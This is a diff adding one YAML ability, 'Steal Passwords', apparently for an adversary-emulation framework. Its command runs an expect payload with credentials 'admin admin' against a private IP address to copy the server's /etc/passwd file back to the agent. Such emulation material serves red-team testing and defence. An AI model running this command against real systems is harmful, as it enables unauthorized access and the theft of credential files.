@@ -1,0 +1,18 @@
+- requirements: []
+  name: Steal Passwords
+  tactic: collection
+  description: Access to the server at the specified IP using the specified credentials
+    and copy on the agent the /etc/passwd file
+  technique_id: TB010
+  technique_name: Credentials from Password Stores
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: linux
+    name: sh
+    payloads:
+    - steal_passwords.exp
+    parsers: []
+    command: mv steal_passwords.exp /tmp/steal_passwords.exp; /tmp/steal_passwords.exp
+      admin admin 192.168.3.10
+  id: 138c07bb-4515-4ab8-bfde-ff427238426a
